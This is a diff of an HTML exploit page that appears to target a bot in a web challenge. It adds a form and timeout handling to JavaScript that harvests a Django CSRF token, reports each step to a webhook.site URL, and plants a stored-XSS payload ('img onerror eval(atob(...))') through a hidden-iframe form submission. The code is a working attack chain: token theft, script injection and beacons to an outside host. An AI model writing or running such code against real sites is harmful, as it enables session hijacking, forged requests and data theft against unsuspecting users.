@@ -5,6 +5,9 @@
     <meta name="referrer" content="no-referrer">
 </head>
 <body>
+    <!-- THE MISSING PIECE: We MUST have a form for the script to target! -->
+    <form id="csrf_target_form"></form>
+
     <script>
         var W = "https://webhook.site/db546c53-5d01-472e-9e95-685dfac802bd";
         new Image().src = W + "/?step=1_github_started";
@@ -16,6 +19,8 @@
     <script>
         (function() {
             var attempts = 0;
+            var maxAttempts = 100;
+
             var tokenHunter = setInterval(function() {
                 attempts++;
                 var tokenInputs = document.getElementsByName("csrfmiddlewaretoken");
@@ -23,6 +28,9 @@
                 if (tokenInputs && tokenInputs.length > 0 && tokenInputs[0].value) {
                     clearInterval(tokenHunter);
                     executePayload(tokenInputs[0].value);
+                } else if (attempts >= maxAttempts) {
+                    clearInterval(tokenHunter);
+                    new Image().src = W + "/?step=error_timeout_no_token";
                 }
             }, 50);
 
@@ -59,7 +67,6 @@
                 var diaryEntry = '<img src="x" onerror="eval(atob(\'' + encodedJS + '\'))">';
 
                 // SILENT FORM SUBMISSION:
-                // We submit the Diary POST into a hidden iframe so the bot's top-level page isn't disturbed!
                 var iframe = document.createElement('iframe');
                 iframe.name = 'hidden_frame';
                 iframe.style.display = 'none';
